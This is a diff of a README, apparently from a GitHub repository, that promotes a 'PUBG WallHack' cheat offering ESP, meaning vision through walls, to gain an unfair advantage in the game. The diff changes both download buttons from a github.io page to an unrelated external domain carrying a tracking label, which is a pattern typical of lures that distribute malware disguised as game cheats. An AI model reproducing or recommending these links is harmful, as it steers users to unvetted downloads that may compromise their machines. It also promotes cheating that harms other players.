@@ -2,7 +2,7 @@
 
 The **PUBG WallHack (WH)** is a powerful external cheat that provides advanced ESP (Extra Sensory Perception) features, allowing you to see enemies, items, vehicles, and more through walls, terrain, and obstacles. Perfect for players who want maximum map awareness and the ability to make smarter, more strategic plays in every match.
 
-[![Download PUBG WH](https://img.shields.io/badge/Download-PUBG%20WH-blueviolet)](https://pubg-wh.github.io/.github/)
+[![Download PUBG WH](https://img.shields.io/badge/Download-PUBG%20WH-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 Whether you're chasing a win in ranked or just want to outplay squads with surgical precision, this WallHack tool offers a clean, efficient interface and ultra-responsive visuals that won't hinder your frame rate or gameplay experience.
 
@@ -46,4 +46,4 @@ The **PUBG WH** tool is made for those who want full control of their vision and
 
 **Maximize your vision. Play smarter. Win more.**
 
-[![Download PUBG WH](https://img.shields.io/badge/Download-PUBG%20WH-blueviolet)](https://pubg-wh.github.io/.github/)
+[![Download PUBG WH](https://img.shields.io/badge/Download-PUBG%20WH-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
